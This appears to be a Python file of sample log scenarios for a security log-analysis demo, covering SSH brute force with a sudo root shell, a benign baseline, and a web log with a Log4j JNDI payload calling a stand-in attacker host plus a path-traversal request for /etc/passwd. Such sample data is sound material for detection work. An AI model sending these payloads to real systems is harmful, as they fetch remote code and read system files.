from typing import Dict

DEMO_SCENARIOS: Dict[str, str] = {
    "brute_force_privilege_escalation": """
Oct 11 02:14:10 edge-server sshd[3101]: Failed password for invalid user admin from 198.51.100.44 port 38221 ssh2
Oct 11 02:14:12 edge-server sshd[3102]: Failed password for invalid user admin from 198.51.100.44 port 38222 ssh2
Oct 11 02:14:14 edge-server sshd[3103]: Failed password for invalid user test from 198.51.100.44 port 38223 ssh2
Oct 11 02:14:16 edge-server sshd[3104]: Failed password for invalid user ubuntu from 198.51.100.44 port 38224 ssh2
Oct 11 02:14:19 edge-server sshd[3105]: Failed password for deployer from 198.51.100.44 port 38225 ssh2
Oct 11 02:14:22 edge-server sshd[3106]: Failed password for deployer from 198.51.100.44 port 38226 ssh2
Oct 11 02:14:28 edge-server sshd[3109]: Accepted password for deployer from 198.51.100.44 port 38228 ssh2
Oct 11 02:14:35 edge-server sudo: deployer : TTY=pts/1 ; PWD=/home/deployer ; USER=root ; COMMAND=/bin/bash
""".strip(),

    "log4j_exploit_injection": """
203.0.113.88 - - [14/Nov/2024:08:12:01 +0000] "GET /login?username=${jndi:ldap://evil-recon.attacker.org/payload} HTTP/1.1" 400 482
203.0.113.88 - - [14/Nov/2024:08:12:05 +0000] "POST /api/auth HTTP/1.1" 400 310
203.0.113.88 - - [14/Nov/2024:08:12:10 +0000] "GET /search?q=../../../../etc/passwd HTTP/1.1" 403 210
203.0.113.88 - - [14/Nov/2024:08:12:15 +0000] "GET /admin HTTP/1.1" 401 190
""".strip(),

    "benign_baseline": """
Oct 11 09:00:01 web-node-01 systemd[1]: Started Daily apt upgrade and clean activities.
Oct 11 09:05:22 web-node-01 sshd[4401]: Accepted publickey for devops from 10.0.1.25 port 51230 ssh2
Oct 11 09:10:14 web-node-01 sudo: devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/docker ps
Oct 11 09:15:30 web-node-01 CRON[4899]: (root) CMD (test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; })
""".strip()
}

